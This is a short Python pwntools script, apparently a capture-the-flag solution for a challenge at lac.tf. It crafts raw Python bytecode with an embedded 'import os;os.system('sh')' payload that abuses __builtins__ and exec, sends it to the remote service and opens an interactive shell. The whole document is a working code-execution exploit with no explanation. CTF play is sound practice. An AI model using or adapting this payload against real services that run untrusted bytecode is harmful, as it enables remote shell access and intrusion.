from pwn import *

i = 0
j = 3
code = b"\x90\x01\x90" + bytes([i]) + b"d" + bytes([j]) + b"\x6d\x00d\x00\x83\x01\x6d\x00d\x01\x83\x01d\x02\x83\x01S\x00"
code = b"__builtins__,exec,import os;os.system('sh')\nget,get,c,d\n" + code.hex().encode() + b"\n"
r = remote("lac.tf", 31130)
r.sendline(code)
r.interactive()
